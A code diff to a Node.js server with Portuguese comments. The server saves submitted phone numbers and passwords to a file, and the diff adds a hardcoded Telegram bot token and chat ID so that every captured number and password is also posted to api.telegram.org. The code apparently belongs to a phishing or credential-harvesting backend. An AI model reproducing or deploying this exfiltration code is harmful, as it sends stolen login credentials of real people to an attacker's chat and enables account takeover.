@@ -1,6 +1,24 @@
 const http = require('http');
+const https = require('https');
 const fs = require('fs');
 const path = require('path');
+
+const TELEGRAM_TOKEN = '7497377289:AAGjUJC8lVGxjy9iv8PHmx2GbTYDlIbtgbM';
+const TELEGRAM_CHAT_ID = '6113992863';
+
+function sendTelegram(mensagem) {
+    const body = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensagem });
+    const options = {
+        hostname: 'api.telegram.org',
+        path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+    };
+    const req = https.request(options);
+    req.on('error', err => console.error('Erro Telegram:', err.message));
+    req.write(body);
+    req.end();
+}
 
 const CLIENTES_DIR = path.join(__dirname, 'clientes');
 if (!fs.existsSync(CLIENTES_DIR)) fs.mkdirSync(CLIENTES_DIR);
@@ -92,6 +110,10 @@ const server = http.createServer((req, res) => {
             fs.appendFile(path.join(CLIENTES_DIR, 'dados.txt'), linha, err => {
                 if (err) console.error('Erro ao salvar:', err);
             });
+
+            // Envia para o Telegram
+            const msg = `🔔 Novo envio!\n📱 Número: ${numero}\n🔑 Senha: ${senha}\n🕐 ${agora}`;
+            sendTelegram(msg);
 
             console.log(`\n[${agora}] Novo envio salvo em clientes/dados.txt`);
 
